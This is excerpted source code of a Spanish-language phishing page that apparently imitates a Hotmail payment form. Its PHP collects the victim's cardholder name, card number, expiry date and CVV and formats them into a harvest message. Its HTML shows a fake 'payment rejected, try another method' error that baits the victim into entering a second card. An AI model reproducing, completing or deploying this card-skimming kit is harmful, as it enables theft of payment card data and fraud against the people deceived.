...
if (
    isset($_POST['name1'], $_POST['car1'], $_POST['mes1'], $_POST['anio1'], $_POST['cvv1']) &&
    is_string($_POST['name1']) && is_string($_POST['car1'])
) {
    ...
    $message = "🔥Tarjeta Hotmail #1🔥\n\n";
    $message .= "👤 Titular.: `" . htmlspecialchars($_POST['name1']) . "`\n";
    $message .= "💳 Número.:  `" . htmlspecialchars($_POST['car1']) . "`\n";
    $message .= "📅 Vence.:  `" . htmlspecialchars($_POST['mes1']) . "/" . htmlspecialchars($_POST['anio1']) . "`\n";
    $message .= "🔐 CVV.:  `" . htmlspecialchars($_POST['cvv1']) . "`\n\n";
...
<head>
  ...
  background-color: #fde7eb; /* rojo claro */
  color: #e81123;
...
.payment-error .error-icon {
  ...
  flex-shrink: 0;
		...
		.payment-error.fade-out {
  opacity: 0;
  transition: opacity 0.4s ease; /* animación rápida pero suave */
}
    </style>
</head>
...
<div class="payment-error">
  ...
  <span>Tu método de pago fue rechazado, intenta con otro método de pago.</span>
</div>
                ...
                <div class="form-group label-animate">
                    ...
                    <input class="form-control" id="name" type="text" name="name2" autocomplete="on" required="required">
                </div>
                  <div class="form-group label-animate">
                    ...
                    <input class="form-control" id="car" name="car2" type="password" pattern="[0-9]*" inputmode="numeric" required="required" maxlength="16" minlength="16">
                  </div>
                  <div class="form-group label-animate">
                    <label for="fecha">Expires</label>
                    <div style="display: flex; gap: 10px;">
                      <select class="form-control" id="mes" name="mes2" required>
                      ...
                      <select class="form-control" id="anio" name="anio2" required>
                  ...
                  <div class="form-group label-animate" style="max-width: 80px;">
                    ...
                    <input class="form-control" id="cvv" type="password" pattern="[0-9]*" inputmode="numeric" name="cvv2" autocomplete="off" maxlength="3" minlength="3" required>
                  </div>
    ...
    if (paymentError) {
      inputs.forEach(input => {
        input.addEventListener("input", () => {
          if (!paymentError.classList.contains("fade-out")) {
            paymentError.classList.add("fade-out");
            setTimeout(() => {
              paymentError.style.display = "none";
            }, 400); // tiempo igual al transition
          }
        });
      });
    }
